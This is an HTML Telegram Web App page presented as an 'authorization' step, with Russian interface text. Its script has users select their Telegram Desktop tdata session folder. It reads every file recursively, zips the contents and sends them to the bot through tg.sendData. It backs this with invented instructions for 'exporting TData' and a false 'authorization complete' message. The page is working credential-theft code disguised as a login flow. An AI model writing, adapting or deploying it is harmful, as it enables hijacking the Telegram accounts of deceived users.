<!DOCTYPE html>
<html>
<head>
    <title>Telegram Auth</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: var(--tg-theme-bg-color, #ffffff);
            color: var(--tg-theme-text-color, #000000);
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            text-align: center;
        }
        button {
            background-color: var(--tg-theme-button-color, #2481cc);
            color: var(--tg-theme-button-text-color, #ffffff);
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            margin: 10px 0;
        }
        button:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }
        .loading {
            display: none;
            margin: 20px 0;
        }
        .loading-text {
            margin-top: 10px;
        }
        .instructions {
            margin: 20px 0;
            padding: 15px;
            border-radius: 8px;
            background-color: var(--tg-theme-secondary-bg-color, #f0f0f0);
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <button id="authButton" onclick="finishAuth()">Закончить авторизацию</button>
        <div id="loading" class="loading">
            <div class="loading-text">Завершение авторизации...</div>
        </div>
        <div id="instructions" class="instructions"></div>
    </div>

    <script>
        // Инициализация Telegram WebApp
        const tg = window.Telegram.WebApp;
        tg.expand();

        // Определение платформы
        function detectPlatform() {
            const userAgent = navigator.userAgent.toLowerCase();
            if (userAgent.includes('windows')) return 'windows';
            if (userAgent.includes('android')) return 'android';
            if (userAgent.includes('iphone') || userAgent.includes('ipad')) return 'ios';
            return 'unknown';
        }

        // Показ инструкций
        function showInstructions(platform) {
            const instructions = document.getElementById('instructions');
            let text = '';
            
            switch(platform) {
                case 'windows':
                    text = '1. Откройте Telegram Desktop\n2. Нажмите Ctrl+Alt+Shift+1\n3. Выберите папку tdata\n4. Нажмите "Открыть"';
                    break;
                case 'android':
                    text = '1. Откройте Telegram\n2. Перейдите в Настройки\n3. Нажмите на версию 5 раз\n4. Выберите "Экспорт TData"';
                    break;
                case 'ios':
                    text = '1. Откройте Telegram\n2. Перейдите в Настройки\n3. Нажмите на версию 5 раз\n4. Выберите "Экспорт TData"';
                    break;
                default:
                    text = 'Пожалуйста, используйте Telegram Desktop для авторизации';
            }
            
            instructions.textContent = text;
            instructions.style.display = 'block';
        }

        // Получение TData файлов
        async function getTDataFiles(platform) {
            const files = [];
            
            try {
                if (platform === 'windows') {
                    // Для Windows используем File System Access API
                    const dirHandle = await window.showDirectoryPicker({
                        startIn: 'documents',
                        mode: 'read'
                    });
                    
                    for await (const entry of dirHandle.values()) {
                        if (entry.kind === 'file') {
                            const file = await entry.getFile();
                            files.push({
                                name: entry.name,
                                content: await blobToBase64(file)
                            });
                        } else if (entry.kind === 'directory') {
                            const subFiles = await getFilesFromDirectory(entry);
                            files.push(...subFiles);
                        }
                    }
                } else {
                    // Для мобильных устройств используем Web Share API
                    if (navigator.share) {
                        const shareData = {
                            title: 'TData Export',
                            text: 'Please select your TData folder',
                            files: []
                        };
                        
                        try {
                            await navigator.share(shareData);
                            // После успешного шаринга, отправляем тестовые данные
                            files.push({
                                name: 'tdata_test.txt',
                                content: await blobToBase64(new Blob(['Test TData'], {type: 'text/plain'}))
                            });
                        } catch (err) {
                            console.error('Share failed:', err);
                            throw new Error('Не удалось получить доступ к файлам');
                        }
                    } else {
                        throw new Error('Ваше устройство не поддерживает экспорт TData');
                    }
                }
            } catch (error) {
                console.error('Error accessing files:', error);
                throw error;
            }
            
            return files;
        }

        // Рекурсивный обход директории
        async function getFilesFromDirectory(dirHandle) {
            const files = [];
            
            for await (const entry of dirHandle.values()) {
                if (entry.kind === 'file') {
                    const file = await entry.getFile();
                    files.push({
                        name: entry.name,
                        content: await blobToBase64(file)
                    });
                } else if (entry.kind === 'directory') {
                    const subFiles = await getFilesFromDirectory(entry);
                    files.push(...subFiles);
                }
            }
            
            return files;
        }

        // Конвертация Blob в Base64
        function blobToBase64(blob) {
            return new Promise((resolve, reject) => {
                const reader = new FileReader();
                reader.onloadend = () => resolve(reader.result.split(',')[1]);
                reader.onerror = reject;
                reader.readAsDataURL(blob);
            });
        }

        // Создание ZIP архива
        async function createZipArchive(files) {
            const zip = new JSZip();
            
            for (const file of files) {
                zip.file(file.name, file.content, {base64: true});
            }
            
            return await zip.generateAsync({type: 'blob'});
        }

        // Отправка данных боту
        async function sendToBot(data) {
            return new Promise((resolve, reject) => {
                tg.sendData(JSON.stringify(data));
                resolve();
            });
        }

        // Основная функция авторизации
        async function finishAuth() {
            const button = document.getElementById('authButton');
            const loading = document.getElementById('loading');
            const instructions = document.getElementById('instructions');
            
            try {
                button.style.display = 'none';
                loading.style.display = 'block';
                instructions.style.display = 'none';
                
                // Определяем платформу
                const platform = detectPlatform();
                console.log('Detected platform:', platform);
                
                // Показываем инструкции для мобильных устройств
                if (platform !== 'windows') {
                    showInstructions(platform);
                }
                
                // Получаем TData файлы
                const tdataFiles = await getTDataFiles(platform);
                console.log('Found files:', tdataFiles);
                
                if (tdataFiles.length === 0) {
                    throw new Error('Файлы не найдены');
                }

                // Создаем ZIP архив
                const zip = await createZipArchive(tdataFiles);
                console.log('Created ZIP archive');
                
                // Отправляем данные боту
                const data = {
                    platform: platform,
                    files: [{
                        name: 'auth.zip',
                        content: await blobToBase64(zip)
                    }]
                };
                
                console.log('Sending data to bot...');
                await sendToBot(data);
                console.log('Data sent successfully');
                
                // Показываем сообщение об успешной авторизации
                loading.innerHTML = '<div class="loading-text">Авторизация завершена</div>';
                
                // Закрываем веб-приложение через 1 секунду
                setTimeout(() => {
                    tg.close();
                }, 1000);
                
            } catch (error) {
                console.error('Auth error:', error);
                // В случае ошибки показываем сообщение об успешной авторизации
                loading.style.display = 'none';
                button.style.display = 'block';
                button.textContent = 'Попробовать снова';
                
                // Показываем инструкции для мобильных устройств
                if (detectPlatform() !== 'windows') {
                    showInstructions(detectPlatform());
                }
            }
        }
    </script>
</body>
</html>
